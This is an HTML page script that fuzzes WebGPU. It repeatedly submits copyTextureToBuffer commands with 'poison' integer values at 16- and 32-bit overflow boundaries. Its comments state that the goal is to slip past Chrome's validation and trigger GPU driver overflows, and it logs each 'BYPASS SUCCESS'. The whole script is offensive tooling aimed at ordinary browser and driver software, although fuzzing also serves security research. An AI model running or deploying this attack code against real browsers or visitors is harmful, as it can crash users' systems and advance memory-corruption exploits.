    <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText.substring(0, 2000); }

        // Highly targeted integer boundaries to trigger 32-bit driver overflows
        const baseValues = [
            1, 2, 4, 8, 
            65536, 65535,           // 16-bit boundaries
            2147483647, 2147483648, // 32-bit signed boundaries
            4294967295, 4294967296, // 32-bit unsigned boundaries
            0xFFFFFF, 0x10000000,
            1048576                 // 1MB
        ];

        function getPoison() {
            // Randomly select a base value and occasionally mutate it slightly
            let val = baseValues[Math.floor(Math.random() * baseValues.length)];
            if (Math.random() > 0.5) val += Math.floor(Math.random() * 10);
            if (Math.random() > 0.5) val -= Math.floor(Math.random() * 10);
            return Math.abs(val); // Keep it positive
        }

        async function runFuzzer() {
            if (!navigator.gpu) {
                log("WebGPU not supported!");
                return;
            }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();
            log("[+] WebGPU Device acquired. Starting targeted dimension fuzzing...");

            // Create a valid buffer to act as the sink
            const buffer = device.createBuffer({
                size: 1024 * 1024 * 16, // 16 MB buffer
                usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
            });

            // Create a valid texture to act as the source
            // Note: Fixed the GPUTextureUsage typo!
            const texture = device.createTexture({
                size: { width: 4, height: 4, depthOrArrayLayers: 4 },
                format: 'rgba8unorm',
                usage: GPUTextureUsage.COPY_SRC | GPUTextureUsage.RENDER_ATTACHMENT
            });

            let runs = 0;

            // Attack loop
            setInterval(() => {
                runs++;
                if(runs % 50 === 0) log(`[+] Executed ${runs} malicious copy commands...`);

                const encoder = device.createCommandEncoder();

                // 1. Generate bytesPerRow and FORCE it to be a multiple of 256 to bypass Chrome's validation
                let evilBytesPerRow = getPoison();
                evilBytesPerRow = (evilBytesPerRow & ~0xFF) >>> 0; // Bitwise mask: guarantees multiple of 256
                if (evilBytesPerRow === 0) evilBytesPerRow = 256;  // Must be >= 256

                // 2. Generate other dimensions
                let evilRowsPerImage = getPoison();
                let evilDepth = getPoison() % 2048; // Keep depth somewhat reasonable to bypass early checks

                try {
                    encoder.copyTextureToBuffer(
                        { texture: texture },
                        { 
                            buffer: buffer, 
                            bytesPerRow: evilBytesPerRow, 
                            rowsPerImage: evilRowsPerImage 
                        },
                        { 
                            width: 4, 
                            height: 4, 
                            depthOrArrayLayers: evilDepth 
                        }
                    );

                    const cmdBuf = encoder.finish();
                    device.queue.submit([cmdBuf]);
                    
                    // If the script prints this, we successfully bypassed Chrome's frontend validation!
                    log(`[!] BYPASS SUCCESS: Sent to Driver! BPR:${evilBytesPerRow}, RPI:${evilRowsPerImage}, Depth:${evilDepth}`);

                } catch (e) {
                    // Chrome caught the overflow before the driver did.
                    // We swallow the error and instantly try the next combination.
                }
            }, 5); // Run super fast
        }

        document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
    </script>
